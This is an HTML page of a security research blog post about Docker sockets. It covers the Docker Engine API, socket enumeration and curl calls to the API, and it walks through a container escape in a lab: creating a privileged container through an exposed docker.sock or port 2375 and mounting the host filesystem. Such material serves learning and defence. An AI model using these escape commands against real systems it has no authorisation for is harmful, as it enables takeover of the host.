@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Useful Docker commands &amp; exploring Docker sockets :: Research blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="What is a docker socket Docker has a RESTful API for interacting with the Docker daemon (called the Docker engine API). This daemon is used to handle the running and managing of containers. It can listen for Docker Engine API requests via three different types of Socket: unix, tcp, and fd.
+Communication to a container can be created through the unix domain socket (or IPC socket) which is created at /var/run/docker." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://thomas-byrne.co.uk/research/docker/docker-commands/" />
+
+
+
+
+<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">
+
+  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Useful Docker commands &amp; exploring Docker sockets :: Research blog">
+<meta property="og:description" content="This post talks about Docker sockets and all the ways we can interact with a Docker socket as well as techniques used to escape docker containers through exposed Docker sockets." />
+<meta property="og:url" content="https://thomas-byrne.co.uk/research/docker/docker-commands/" />
+<meta property="og:site_name" content="Useful Docker commands &amp; exploring Docker sockets" />
+
+  <meta property="og:image" content="https://thomas-byrne.co.uk/.">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-10 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/hackthebox">HackTheBox</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/oscp">OSCP</a></li>
+              
+            
+              
+                <li><a href="/projects">Projects</a></li>
+              
+            
+              
+                <li><a href="/research">Research</a></li>
+              
+            
+              
+                <li><a href="/showcase">Showcase</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/hackthebox">HackTheBox</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+      
+        <li><a href="/research">Research</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://thomas-byrne.co.uk/research/docker/docker-commands/">Useful Docker commands &amp; exploring Docker sockets</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-10 
+      </span>
+    
+    
+    <span class="post-author">:: Tom</span>
+    
+  </div>
+
+  
+
+  
+    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="Useful Docker commands &amp; exploring Docker sockets" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="what-is-a-docker-socket">What is a docker socket<a href="#what-is-a-docker-socket" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Docker has a RESTful API for interacting with the Docker daemon (called the Docker engine API). This daemon is used to handle the running and managing of containers. It can listen for <a href="https://docs.docker.com/engine/api/">Docker Engine API</a> requests via three different types of Socket: <code>unix</code>, <code>tcp</code>, and <code>fd</code>.</p>
+<p>Communication to a container can be created through the <code>unix</code> domain socket (or IPC socket) which is created at <code>/var/run/docker.sock</code>.
+UNIX sockets are the same as network sockets except that a path and file are used as addresses for client-server communication (IPC).</p>
+<p>By exposing the Docker API inside of a container through /var/run/docker.sock you are allowing anyone in the docker group or root privileges to use the Docker API which can lead to commands being executed on the host.</p>
+<h1 id="general-docker-commands">General docker commands<a href="#general-docker-commands" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="create-container">Create container<a href="#create-container" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker -H 192.168.22.130:2375 container create -it --privileged --name test5 alpine
+84551dbee2b0b5dd61a998d09543f4ba7402b36fa8caa84484e32d2aefcf0508
+
+docker -H 192.168.22.130:2375 container start --attach -i 84551dbee2b0 
+/ <span style="color:#75715e"># hostname </span>
+84551dbee2b0
+
+docker run -it --name mycontainer2 alpine
+
+
+</code></pre></div><h2 id="execute-commands-on-container">Execute commands on container<a href="#execute-commands-on-container" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -it mycontainer2 ls
+docker run localImage ls
+
+
+docker exec mycontainer2 ls
+
+</code></pre></div><h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="find-socket-files">Find socket files<a href="#find-socket-files" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find . / -type s,p   
+find / -name docker.sock 2&gt;/dev/null
+</code></pre></div><h2 id="find-sockets">Find sockets<a href="#find-sockets" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/proc/net/tcp -a list of open tcp sockets
+/proc/net/udp -a list of open udp sockets
+/proc/net/raw -a list all the <span style="color:#e6db74">&#39;raw&#39;</span> sockets
+</code></pre></div><h1 id="docker-api-communication">Docker API communication<a href="#docker-api-communication" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="connect-through-socket">Connect through socket<a href="#connect-through-socket" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl --unix-socket docker.sock http://localhost/v1.41/images/json
+
+docker -H docker.sock YourDockerCommand
+</code></pre></div><h2 id="create-container-1">Create container<a href="#create-container-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl --unix-socket docker.sock -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;Image&#34;: &#34;level2&#34;, &#34;Cmd&#34;: [&#34;hostname&#34;]}&#39;</span> -X POST http://localhost/v1.41/containers/create
+</code></pre></div><h2 id="start-container">Start container<a href="#start-container" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl --unix-socket docker.sock -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -X POST http://localhost/v1.41/containers/&lt;CONATINER ID&gt;/start
+</code></pre></div><h2 id="create-command-to-execute">Create command to execute<a href="#create-command-to-execute" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl --unix-socket docker.sock http://localhost/v1.41/containers/&lt;CONTAINER ID&gt;/exec -d <span style="color:#e6db74">&#39;{&#34;AttachStderr&#34;: true,&#34;AttachStdout&#34;: true,&#34;Tty&#34;:true,&#34;Cmd&#34;:[&#34;ls&#34;]}&#39;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span>
+</code></pre></div><h2 id="start-execution-of-command">Start execution of command<a href="#start-execution-of-command" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl --unix-socket docker.sock http://localhost/v1.41/exec/&lt;INSERT ID&gt;/start -d <span style="color:#e6db74">&#39;{&#34;Tty&#34;:true}&#39;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> 
+
+
+
+curl --unix-socket docker.sock -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;Image&#34;: &#34;level2&#34;,  &#34;HostConfig&#34;:{&#34;Privileged&#34;:true}}&#39;</span> -X POST http://localhost/v1.41/containers/create
+</code></pre></div><h1 id="escape-container-with-docker-api">Escape container with docker API<a href="#escape-container-with-docker-api" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>If a docker container you are in has exposed the docker API through an IPC socket, docker daemon or by opening the docker port it can be abused to open a privileged container which can then mount the hosts file system inside of it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@62f69d202b3a:/$ curl --unix-socket docker.sock -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;Image&#34;: &#34;level2&#34;,  &#34;HostConfig&#34;:{&#34;Privileged&#34;:true}}&#39;</span> -X POST http://localhost/v1.41/containers/create
+
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;Id&#34;</span>:<span style="color:#e6db74">&#34;13e1568e2363cc35874f47cb032653ae94eb91f469b3bcd8f7383aacbd1527a0&#34;</span>,<span style="color:#e6db74">&#34;Warnings&#34;</span>:<span style="color:#f92672">[]}</span>
+
+
+root@62f69d202b3a:/$ curl --unix-socket docker.sock -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -X POST http://localhost/v1.41/containers/13e1568e2363cc35874f47cb032653ae94eb91f469b3bcd8f7383aacbd1527a0/start
+
+
+root@62f69d202b3a:/$ curl --unix-socket docker.sock http://localhost/v1.41/containers/13e1568e2363cc35874f47cb032653ae94eb91f469b3bcd8f7383aacbd1527a0/exec -d <span style="color:#e6db74">&#39;{&#34;AttachStderr&#34;: true,&#34;AttachStdout&#34;: true,&#34;Tty&#34;:true,&#34;Cmd&#34;:[&#34;mkdir&#34;,&#34;-p&#34;,&#34;/mnt/hola&#34;]}&#39;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span>
+
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;Id&#34;</span>:<span style="color:#e6db74">&#34;72bdfff486d7b3912a1b5dfee65a6b789869d06f70163d7a5d47adf0a36fa741&#34;</span><span style="color:#f92672">}</span>
+
+
+
+root@62f69d202b3a:/$ curl --unix-socket docker.sock http://localhost/v1.41/exec/72bdfff486d7b3912a1b5dfee65a6b789869d06f70163d7a5d47adf0a36fa741/start -d <span style="color:#e6db74">&#39;{&#34;Tty&#34;:true}&#39;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span>
+bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var
+boot  etc  lib   lib64  media   opt  root  sbin  sys  usr
+</code></pre></div><h2 id="docker-port-exposed">Docker port exposed<a href="#docker-port-exposed" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>The <code>docker -H</code> command can be supplied to provide the address of a remote host to run docker commands against</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/dockerEscapes/lab1<span style="color:#f92672">]</span>         
+└─$ docker -H 192.168.22.130:2375 info    
+Native Overlay Diff: true
+  userxattr: false
+ Logging Driver: json-file
+ Cgroup Driver: cgroupfs
+ Cgroup Version: <span style="color:#ae81ff">1</span>
+ Plugins:
+  Volume: local
+  Network: bridge host ipvlan macvlan null overlay
+  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
+ Swarm: inactive
+ Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc
+ Default Runtime: runc
+ Init Binary: docker-init 
+ containerd version: d71fcd7d8303cbf684402823e425e9dd2e99285d
+ runc version: b9ee9c6314599f1b4a7f497e1f1f856fe433d3b7
+ init version: de40ad0
+ Security Options:
+  apparmor
+  seccomp
+   Profile: default
+ Kernel Version: 4.19.0-17-amd64
+ Operating System: Debian GNU/Linux <span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>hostname<span style="color:#f92672">)</span>
+</code></pre></div><p>Either of these commands can be ran to escape a docker container, the second one provides a privileged container which can then be used to mount the hosts file system inside the container.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
+
+docker run --rm -it --privileged ubuntu bash
+</code></pre></div><p>These commands mount the hosts file system inside the privileged container</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir -p /mnt/test
+mount /dev/sda1 /mnt/test
+</code></pre></div>
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
+<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
